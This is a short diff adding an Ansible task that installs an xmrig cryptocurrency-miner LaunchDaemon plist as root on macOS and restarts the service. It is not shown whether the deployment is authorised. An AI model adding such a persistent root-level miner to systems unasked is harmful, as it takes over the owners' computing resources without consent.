@@ -1,0 +1,10 @@
+---
+- name: Deploy xmrig LaunchDaemon
+  become: true
+  ansible.builtin.template:
+    src: xmrig-daemon.plist.j2
+    dest: /Library/LaunchDaemons/com.local.xmrig.plist
+    owner: root
+    group: wheel
+    mode: "0644"
+  notify: restart xmrig
